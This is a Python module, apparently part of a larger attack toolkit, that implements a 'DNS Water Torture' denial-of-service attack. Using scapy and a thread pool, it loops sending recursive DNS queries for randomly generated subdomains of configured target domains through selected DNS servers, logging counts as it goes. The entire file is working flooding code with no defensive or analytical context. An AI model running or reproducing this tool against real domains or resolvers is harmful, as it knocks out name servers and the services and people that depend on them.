import asyncio
import random
import string
from scapy.all import IP, UDP, DNS, DNSQR, send
from src.attacks.base import AttackBase

class DnsWaterTorture(AttackBase):
    async def attack_loop(self):
        print("Starte DNS Water Torture Angriff...")
        base_domains = self.config.custom_domains.copy() if self.config.custom_domains else ["example.com"]
        from concurrent.futures import ThreadPoolExecutor
        loop = asyncio.get_event_loop()
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            while not self.stop_event.is_set():
                base_domain = random.choice(base_domains)
                dns_server = random.choice(self.config.dns_servers)
                subdomain_length = random.randint(8, 20)
                subdomain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=subdomain_length))
                full_domain = f"{subdomain}.{base_domain}"
                dns_request = IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=full_domain))
                if self.task_queue:
                    await self.task_queue.put((
                        lambda req=dns_request: send(req, verbose=False),
                        ()
                    ))
                else:
                    await loop.run_in_executor(
                        executor,
                        lambda req=dns_request: send(req, verbose=False)
                    )
                self.stats.update_sent(1, 100)
                await asyncio.sleep(0.01)
